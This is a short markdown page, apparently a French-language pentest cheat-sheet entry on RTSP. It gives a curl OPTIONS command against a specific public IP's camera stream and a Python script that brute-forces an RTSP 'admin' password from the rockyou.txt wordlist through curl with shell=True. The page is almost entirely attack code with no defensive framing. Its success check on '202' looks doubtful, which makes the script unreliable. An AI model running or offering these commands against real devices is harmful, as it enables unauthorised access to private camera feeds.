---
title: "RTSP"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
  noindex: false # false (default) or true
---


- Scan : 
```sh
curl -i -X OPTIONS rtsp://77.238.150.161:554/stream1 RTSP/1.1
```

- Brute force : 
```python
import subprocess

with open('rockyou.txt', 'r') as fichier:
    for ligne in fichier:
        mot_de_passe = ligne.strip()
        commande_curl = f'curl -i -X OPTIONS "rtsp://admin:{mot_de_passe}@10.189.52.215:5000/"'
        
        # Exécute la commande curl et capture la sortie
        response = subprocess.run(commande_curl, shell=True, capture_output=True, text=True)
        
        # Vérifie si "202" est dans la réponse
        if "202" in response.stdout:
            print("Mot de passe trouvé:", mot_de_passe)
            break
        else:
            print("loading")
```